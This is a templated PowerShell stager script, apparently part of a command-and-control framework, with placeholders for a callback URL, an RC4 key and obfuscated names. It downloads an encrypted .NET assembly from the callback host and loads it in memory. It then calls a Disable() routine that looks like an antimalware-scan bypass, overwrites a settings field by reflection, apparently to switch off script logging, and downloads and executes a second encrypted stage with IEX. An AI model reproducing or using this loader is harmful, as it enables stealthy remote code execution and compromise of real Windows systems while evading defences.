${{symbol_name("CALLBACK_URL")}} = "{{callback_url}}"
${{symbol_name("KEY")}} = ([system.Text.Encoding]::UTF8).GetBytes("{{key}}")

{% include "powershell/rc4.ps1" %}


function {{symbol_name("Decrypt-String")}} {
    param(
        [System.String]$string
  	)
    $result = [System.Convert]::FromBase64String($string)
    $result = {{symbol_name("Decrypt-Code")}} $result ${{symbol_name("KEY")}}
    $result = [System.Text.Encoding]::ASCII.GetString($result)
    $result
}

{% for s in strings %}
$string{{loop.index}} = {{symbol_name("Decrypt-String")}} "{{s}}"
{% endfor %}

if(-not ([System.Management.Automation.PSTypeName]"$string1").Type) {
    $K=new-object net.webclient
    $K.proxy=[Net.WebRequest]::GetSystemWebProxy()
    $K.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials
    $DLL = $K.downloadstring(${{symbol_name("CALLBACK_URL")}}+'l')
    $DLL = [System.Convert]::FromBase64String($DLL)
    $DLL = {{symbol_name("Decrypt-Code")}} $DLL ${{symbol_name("KEY")}}
    $DLL = [System.Text.Encoding]::ASCII.GetString($DLL)
    [Reflection.Assembly]::Load([Convert]::FromBase64String($DLL)) | Out-Null
}

try {
    IEX "[$string1]::Disable()"

    $settings = [Ref].Assembly.GetType($string2).GetField($string3,$string4).GetValue($null);
    $settings[$string5] = @{}
    $settings[$string5].Add($string6, "0")
} catch {}

$K=new-object net.webclient
$K.proxy=[Net.WebRequest]::GetSystemWebProxy()
$K.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials
$code = {{symbol_name("Decrypt-String")}} ($K.downloadstring(${{symbol_name("CALLBACK_URL")}}+'{{stage2}}'))

IEX $code
